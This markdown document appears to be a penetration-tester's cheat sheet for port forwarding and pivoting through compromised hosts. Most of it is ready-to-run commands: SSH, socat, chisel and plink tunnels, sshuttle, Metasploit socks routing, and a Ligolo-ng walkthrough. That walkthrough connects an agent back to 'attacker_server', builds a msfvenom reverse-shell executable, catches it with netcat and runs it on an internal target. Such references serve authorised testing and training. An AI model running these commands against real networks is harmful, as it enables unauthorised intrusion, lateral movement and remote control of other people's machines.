# Port Fowarding and Proxying
## Port Fowarding
### SSH Tunneling/Local Port Forwarding  
```
ssh user@<ip> -p port -L 8001:127.0.0.1:8080 -fN
```

### SSH Remote Port Forwarding
```
ssh -R 5555:127.0.0.1:5555 -p2222 <user>@<ip>
```

### Socat - Port Forward
```
./socat.exe TCP-LISTEN:8002,fork,reuseaddr TCP:127.0.0.1:8080
```

### chisel  - Remote Port Forward 
-> Your machine  
```
./chisel server -p <LISTEN_PORT> --reverse &
```

-> Compromised Host
```
./chisel client <ATTACKING_IP>:<LISTEN_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &
```

### Chisel - Local Port Forward
-> Compromised Host  
```
./chisel server -p <LISTEN_PORT>
```

-> Your Machine  
```
./chisel client <LISTEN_IP>:<LISTEN_PORT> <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT>
```

### pklink - Remote Port Forward
```
cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <password> -R 192.168.0.20:1234:127.0.0.1:3306 192.168.0.20
```

## Proxying - Network Pivoting
### sshuttle (Unix) - proxying  
```
sshuttle -r user@<ip> --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

### SSH + Proxychains
edit /etc/proxychains.conf with socks4 127.0.0.1 8080
```
ssh -N -D 127.0.0.1:8080 <user>@<ip> -p 2222
```
  
### chisel  - Reverse Proxy
-> Your Machine  
```
./chisel server -p LISTEN_PORT --reverse &
```
-> Compromised Host  
```
./chisel client <TARGET_IP>:<LISTEN_PORT> R:socks &
```

### chisel - Forward Proxy  
-> Compromised Host  
```
./chisel server -p <LISTEN_PORT> --socks5
```
-> Your Machine  
```
./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
```

### metasploit - proxying 
```
route add <ip>/24 1
route print
use auxiliary/server/socks_proxy
run
```

### Ligolo-ng
```
sudo ip tuntap add user kali mode tun ligolo # Run this first to create a new tun interface for ligolo

ip route list # list routes

sudo ip link set ligolo up # turn on ligolo interface

./proxy -selfcert -laddr 0.0.0.0:443 # Run this on kali attacking machine to start the C2/proxy server

# On Jump host run 

./agent.exe -connect attacker_server:443 -ignore-cert

# After successfull connection is confirmed add route to the target network to kali's routing table

sudo ip route add <Internal_Network> dev ligolo

# then start a tunnel in ligolo using
start

#Nmap scanning thru ligolo
sudo nmap <Internal_Network_IP> -p- -sV -T3 -PE

#Sending reverse shell's back thru ligolo
So if we find ourselves in a situation where we have a pivot setup to the internal network, but the internal machine cant send back a shell to our attack box, we can use ligolo's TCP listeners to get our shell back on our kali box!

# On the Ligolo proxy setup a listener
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:9001 --tcp # This will make it so that any connections sent to port 1234 on our agent back to our kali box on 9001, using this for reverse shell.
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp # This will make it so that any connections sent to port 80 on our agent back to our kali box on 80, using this for transfer tools.

# so if we need to get a shell back thru our pivot we would make a new payload that sends a shell to the Agent box on port 1234
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o revshell-1234.exe LHOST=client01-IP LPORT=1234

#Set a netcat Listener on our Kali Linux
nc -lvnp 9001

# Now on the target/internal machine we want a shell on just run the revshell-1234.exe file and we get a shell!
.\revshell-1234.exe
```
